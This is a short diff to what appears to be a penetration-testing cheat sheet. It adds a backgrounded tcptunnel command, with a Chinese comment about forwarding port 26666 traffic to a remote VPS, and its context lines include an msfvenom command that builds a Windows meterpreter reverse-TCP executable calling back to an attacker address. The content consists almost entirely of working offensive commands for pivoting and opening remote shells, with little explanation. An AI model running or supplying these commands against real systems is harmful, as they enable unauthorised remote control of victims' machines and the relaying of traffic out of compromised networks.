@@ -84,6 +84,10 @@ nc
 # x86
 192.168.142.110$ tcptunnel --local-port=1080 --remote-port=4444 --remote-host=192.168.0.120 --buffer-size=8192 --stay-alive
 
+# 把26666端口流量转发到远程vps
+nohup ./tcptunnel --local-port=26666 --remote-port=26666 --remote-host=1.1.1.1 --buffer-size=8192 --stay-alive &
+
+
 ## msf
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.142.110 lport=1080 -f exe -o shell.exe
 ```
